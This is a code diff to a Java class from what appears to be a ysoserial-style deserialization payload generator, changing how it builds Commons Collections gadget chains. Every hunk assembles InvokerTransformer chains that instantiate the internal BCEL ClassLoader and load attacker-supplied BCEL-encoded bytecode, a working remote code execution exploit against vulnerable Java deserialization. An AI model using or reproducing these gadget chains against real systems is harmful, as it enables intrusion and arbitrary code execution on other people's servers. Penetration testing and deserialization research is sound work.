@@ -1,6 +1,6 @@
 package me.gv7.woodpecker.yso.payloads.custom;
 
-import com.sun.org.apache.bcel.internal.classfile.Utility;
+import me.gv7.woodpecker.bcel.HackBCELs;
 import me.gv7.woodpecker.yso.payloads.util.CommonUtil;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
@@ -69,8 +69,9 @@ public class CommonsCollectionsUtil {
                 new ConstantTransformer(1) };
         } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_BCEL)) {
             String bcelStr = command.substring(CustomCommand.COMMAND_BCEL.length());
+            Class bcelClazz = CommonUtil.getClass("com.sun.org.apache.bcel.internal.util.ClassLoader");
             transformers = new Transformer[]{
-                new ConstantTransformer(com.sun.org.apache.bcel.internal.util.ClassLoader.class),
+                new ConstantTransformer(bcelClazz),
                 new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{}}),
                 new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{}}),
                 new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{bcelStr}),
@@ -80,9 +81,10 @@ public class CommonsCollectionsUtil {
         } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_BCEL_CLASS_FILE)) {
             String bcelClass = command.substring(CustomCommand.COMMAND_BCEL_CLASS_FILE.length());
             byte[] byteCode = CommonUtil.getFileBytes(bcelClass);
-            String bcelStr = "$$BCEL$$" + Utility.encode(byteCode, true);
+            String bcelStr = HackBCELs.encode(byteCode);
+            Class bcelClazz = CommonUtil.getClass("com.sun.org.apache.bcel.internal.util.ClassLoader");
             transformers = new Transformer[]{
-                new ConstantTransformer(com.sun.org.apache.bcel.internal.util.ClassLoader.class),
+                new ConstantTransformer(bcelClazz),
                 new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{}}),
                 new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{}}),
                 new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{bcelStr}),
